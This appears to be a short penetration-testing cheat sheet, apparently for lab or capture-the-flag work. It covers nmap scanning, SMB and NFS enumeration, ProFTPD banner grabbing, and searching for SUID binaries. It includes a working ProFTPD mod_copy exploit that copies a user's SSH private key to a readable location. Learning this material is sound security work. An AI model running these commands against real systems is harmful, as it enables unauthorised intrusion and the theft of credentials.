# thisnthat cheat sheet
-- Open ports with versions
```
nmap -sC -sV $IP
```

-- How many open ports?
```
nmap $IP -vvv
```

-- Enumerate for SMB shares
SMB has two ports, 445 and 139.
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

-- Inspect an **SMB** share
```
smbclient //<ip>/anonymous
```

-- Recursively download the SMB share
```
smbget -R smb://<ip>/anonymous
```

-- show mount 
```
nmap -p <rpc_port> --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

-- get **ProFTPD** version
```
nc $IP 21
```

-- Searchsploit to find exploits. **Searchsploit** is basically just a command line search tool for exploit-db.com.

-- mod_copy exploit: SITE CPFR and SITE CPTO
```
nc $IP 21
SITE CPFR /home/<user>/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

-- find SUID binaries
```
find / -perm -u=s -type f 2>/dev/null
```